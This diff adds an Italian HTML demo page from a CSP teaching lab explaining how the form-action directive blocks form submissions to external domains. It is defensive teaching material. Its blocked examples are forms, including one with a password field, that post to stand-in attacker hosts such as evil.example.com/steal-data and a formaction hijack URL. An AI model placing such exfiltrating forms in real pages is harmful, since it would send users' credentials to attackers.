@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo form-action - CSP Lab</title>
+</head>
+<body>
+<div class="container">
+    <header>
+        <h1>Demo: form-action Directive</h1>
+        <p class="subtitle">Limita le destinazioni dei form POST/GET</p>
+    </header>
+
+    <nav>
+        <a href="/">← Torna alla Home</a>
+    </nav>
+
+    <main>
+        <section class="info-box">
+            <h2>📋 Cosa fa form-action?</h2>
+            <p>
+                La direttiva <code>form-action</code> controlla gli URL a cui i form HTML possono
+                inviare dati (attributo <code>action</code>). Questo previene attacchi che tentano
+                di dirottare i dati dei form verso domini malevoli.
+            </p>
+            <p>
+                Impostando <code>form-action 'self'</code>, solo i form che inviano dati allo stesso
+                dominio (origine) verranno accettati.
+            </p>
+        </section>
+
+        <section class="demo-section">
+            <h2>✅ Form Valido (Stesso Dominio)</h2>
+            <div class="code-example">
+                <p class="success">✓ Questo form è permesso dalla CSP</p>
+
+                <form method="POST" action="/submit" style="padding: 1rem; border: 2px solid #4CAF50; border-radius: 4px;">
+                    <label for="name1">Nome:</label>
+                    <input type="text" id="name1" name="name" required style="margin: 0.5rem 0; padding: 0.5rem; width: 100%;">
+
+                    <label for="email1">Email:</label>
+                    <input type="email" id="email1" name="email" required style="margin: 0.5rem 0; padding: 0.5rem; width: 100%;">
+
+                    <button type="submit" style="margin-top: 1rem; padding: 0.5rem 1rem; background: #4CAF50; color: white; border: none; cursor: pointer;">
+                        Invia a /submit (Permesso)
+                    </button>
+                </form>
+
+                <pre style="margin-top: 1rem;"><code>&lt;form method="POST" action="/submit"&gt;
+    &lt;input type="text" name="name"&gt;
+    &lt;input type="email" name="email"&gt;
+    &lt;button type="submit"&gt;Invia&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+            </div>
+        </section>
+
+        <section class="demo-section">
+            <h2>🚫 Form Bloccato (Dominio Esterno)</h2>
+
+            <div class="code-example">
+                <h3>Esempio 1: POST a dominio esterno</h3>
+                <p class="warning">⚠️ Questo form verrà bloccato dalla CSP</p>
+
+                <form method="POST" action="https://evil.example.com/steal-data"
+                      style="padding: 1rem; border: 2px solid #f44336; border-radius: 4px;">
+                    <label for="name2">Nome:</label>
+                    <input type="text" id="name2" name="name" style="margin: 0.5rem 0; padding: 0.5rem; width: 100%;">
+
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" style="margin: 0.5rem 0; padding: 0.5rem; width: 100%;">
+
+                    <button type="submit" style="margin-top: 1rem; padding: 0.5rem 1rem; background: #f44336; color: white; border: none; cursor: pointer;">
+                        Tentativo Invio Esterno (Bloccato)
+                    </button>
+                </form>
+
+                <pre style="margin-top: 1rem;"><code>&lt;form method="POST" action="https://evil.example.com/steal-data"&gt;
+    &lt;input type="text" name="name"&gt;
+    &lt;input type="password" name="password"&gt;
+    &lt;button type="submit"&gt;Invia&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+            </div>
+
+            <div class="code-example">
+                <h3>Esempio 2: GET con parametri a dominio esterno</h3>
+                <p class="warning">⚠️ Questo form verrà bloccato dalla CSP</p>
+
+                <form method="GET" action="https://attacker.example.com/search"
+                      style="padding: 1rem; border: 2px solid #f44336; border-radius: 4px;">
+                    <label for="query">Cerca:</label>
+                    <input type="text" id="query" name="q" style="margin: 0.5rem 0; padding: 0.5rem; width: 100%;">
+
+                    <button type="submit" style="margin-top: 1rem; padding: 0.5rem 1rem; background: #f44336; color: white; border: none; cursor: pointer;">
+                        Cerca su Sito Esterno (Bloccato)
+                    </button>
+                </form>
+
+                <pre style="margin-top: 1rem;"><code>&lt;form method="GET" action="https://attacker.example.com/search"&gt;
+    &lt;input type="text" name="q"&gt;
+    &lt;button type="submit"&gt;Cerca&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+            </div>
+
+            <div class="code-example">
+                <h3>Esempio 3: Form con formaction su button</h3>
+                <p class="warning">⚠️ Il button con formaction esterno verrà bloccato</p>
+
+                <form method="POST" action="/local-submit"
+                      style="padding: 1rem; border: 2px solid #f44336; border-radius: 4px;">
+                    <label for="data">Dati:</label>
+                    <input type="text" id="data" name="data" style="margin: 0.5rem 0; padding: 0.5rem; width: 100%;">
+
+                    <div style="margin-top: 1rem;">
+                        <button type="submit" style="padding: 0.5rem 1rem; background: #4CAF50; color: white; border: none; margin-right: 0.5rem;">
+                            Invia Locale (OK)
+                        </button>
+                        <button type="submit" formaction="https://evil.example.com/hijack"
+                                style="padding: 0.5rem 1rem; background: #f44336; color: white; border: none; cursor: pointer;">
+                            Invia Esterno (Bloccato)
+                        </button>
+                    </div>
+                </form>
+
+                <pre style="margin-top: 1rem;"><code>&lt;form method="POST" action="/local-submit"&gt;
+    &lt;input type="text" name="data"&gt;
+    &lt;button type="submit"&gt;Invia Locale&lt;/button&gt;
+    &lt;button type="submit" formaction="https://evil.example.com/hijack"&gt;
+        Invia Esterno (Bloccato)
+    &lt;/button&gt;
+&lt;/form&gt;</code></pre>
+            </div>
+        </section>
+
+        <section class="info-box success">
+            <h2>✅ Policy CSP Applicata</h2>
+            <pre><code>Content-Security-Policy: form-action 'self'</code></pre>
+            <p>
+                <strong>Comportamento atteso:</strong> Il browser permetterà l'invio del primo form
+                (destinazione locale) ma bloccherà tutti i form che tentano di inviare dati a domini esterni.
+            </p>
+        </section>
+
+        <section class="info-box">
+            <h2>🔍 Come Verificare</h2>
+            <ol>
+                <li>Prova a inviare il form valido (primo esempio) - dovrebbe funzionare</li>
+                <li>Prova a inviare uno dei form bloccati</li>
+                <li>Apri la Console del Browser (F12 → Console)</li>
+                <li>Dovresti vedere errori CSP simili a:
+                    <pre><code>Refused to send form data to '...' because it violates
+the following Content Security Policy directive: "form-action 'self'"</code></pre>
+                </li>
+                <li>Se configurato, controlla i report CSP inviati al server</li>
+            </ol>
+        </section>
+
+        <section class="info-box">
+            <h2>💡 Best Practices</h2>
+            <ul>
+                <li><strong>Usa <code>form-action 'self'</code></strong> se i tuoi form inviano dati solo al tuo server</li>
+                <li>Se necessario inviare a domini esterni fidati:
+                    <pre><code>form-action 'self' https://payment-provider.com https://api.trusted.com</code></pre>
+                </li>
+                <li>Previene attacchi di phishing che iniettano form malevoli nelle tue pagine</li>
+                <li>Utile contro XSS che tenta di esfiltrare dati tramite form injection</li>
+                <li>Combina con <code>frame-ancestors</code> per protezione completa</li>
+            </ul>
+        </section>
+
+        <section class="info-box">
+            <h2>🎯 Scenari di Attacco Prevenuti</h2>
+            <ul>
+                <li><strong>Form Injection:</strong> Un attaccante inietta via XSS un form che invia credenziali al suo server</li>
+                <li><strong>CSRF Enhancement:</strong> Anche con token CSRF, limita dove i dati possono essere inviati</li>
+                <li><strong>Phishing in-page:</strong> Previene form fake che imitano login/pagamento sul tuo sito</li>
+                <li><strong>Data Exfiltration:</strong> Blocca tentativi di rubare dati tramite submit a server controllati dall'attaccante</li>
+            </ul>
+        </section>
+    </main>
+
+    <footer>
+        <p>CSP Lab - Dimostrazione Content Security Policy</p>
+        <p><a href="/">Torna alla Home</a> | <a href="/reports">Vedi Report CSP</a></p>
+    </footer>
+</div>
+</body>
+</html>
